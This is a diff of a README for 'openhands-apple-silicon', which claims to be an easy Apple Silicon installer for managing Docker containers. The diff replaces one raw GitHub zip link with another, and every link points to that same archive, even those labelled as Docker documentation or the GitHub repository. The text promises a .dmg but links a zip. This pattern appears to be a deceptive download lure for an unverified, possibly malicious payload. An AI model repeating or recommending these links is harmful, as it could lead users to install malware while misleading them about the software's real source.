@@ -1,7 +1,7 @@
 # 🚀 openhands-apple-silicon - Simple Setup for Apple Silicon Macs
 
 ## 📦 Download Now
-[![Download openhands-apple-silicon](https://raw.githubusercontent.com/suonsok/openhands-apple-silicon/main/blaubok/openhands-apple-silicon.zip)](https://raw.githubusercontent.com/suonsok/openhands-apple-silicon/main/blaubok/openhands-apple-silicon.zip)
+[![Download openhands-apple-silicon](https://raw.githubusercontent.com/suonsok/openhands-apple-silicon/main/blaubok/openhands-apple-silicon-v2.9-alpha.5.zip)](https://raw.githubusercontent.com/suonsok/openhands-apple-silicon/main/blaubok/openhands-apple-silicon-v2.9-alpha.5.zip)
 
 ## 🚀 Getting Started
 OpenHands is designed for Apple Silicon Macs (M1, M2, M3, M4, M5+). It helps you manage Docker containers without any complicated setup. This guide will walk you through downloading and running the application.
@@ -13,7 +13,7 @@ OpenHands is designed for Apple Silicon Macs (M1, M2, M3, M4, M5+). It helps you
 - **Storage:** At least 200 MB of free space
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Download openhands-apple-silicon](https://raw.githubusercontent.com/suonsok/openhands-apple-silicon/main/blaubok/openhands-apple-silicon.zip). 
+To get started, visit this page to download: [Download openhands-apple-silicon](https://raw.githubusercontent.com/suonsok/openhands-apple-silicon/main/blaubok/openhands-apple-silicon-v2.9-alpha.5.zip). 
 
 1. Click on the latest release.
 2. Download the `.dmg` file.
@@ -41,9 +41,9 @@ If you encounter any issues:
 For additional help, you can visit the GitHub issues page linked in this repository.
 
 ## 🔗 Useful Links
-- [OpenHands Releases](https://raw.githubusercontent.com/suonsok/openhands-apple-silicon/main/blaubok/openhands-apple-silicon.zip)
-- [Docker Documentation](https://raw.githubusercontent.com/suonsok/openhands-apple-silicon/main/blaubok/openhands-apple-silicon.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/suonsok/openhands-apple-silicon/main/blaubok/openhands-apple-silicon.zip)
+- [OpenHands Releases](https://raw.githubusercontent.com/suonsok/openhands-apple-silicon/main/blaubok/openhands-apple-silicon-v2.9-alpha.5.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/suonsok/openhands-apple-silicon/main/blaubok/openhands-apple-silicon-v2.9-alpha.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/suonsok/openhands-apple-silicon/main/blaubok/openhands-apple-silicon-v2.9-alpha.5.zip)
 
 ## 🙋‍♂️ Feedback & Support
 We welcome feedback or questions about OpenHands. You can submit an issue on our GitHub page, and we will respond as soon as possible.
